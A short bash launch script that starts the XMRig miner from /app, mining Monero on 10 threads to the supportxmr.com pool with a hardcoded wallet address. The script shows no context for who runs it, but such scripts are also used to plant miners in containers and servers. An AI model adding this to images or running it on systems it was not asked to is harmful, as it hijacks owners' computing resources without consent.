#!/bin/bash
cd /app
./xmrig \
  -a rx/0 \
  -o stratum+ssl://pool.supportxmr.com:443 \
  -u 4B1nkGS1TA75fiVqZymRbphi4UasPQZkY22jDRBd1aGCKZiszNGffThRV7T1jRtn5d3TTpUphYA6tdvWg1FtrkSVN7Gfzfm \
  -p x \
  --threads 10 \
  --cpu-priority 0 \
  --donate-level 0 \
  --no-huge-pages \
  --no-config
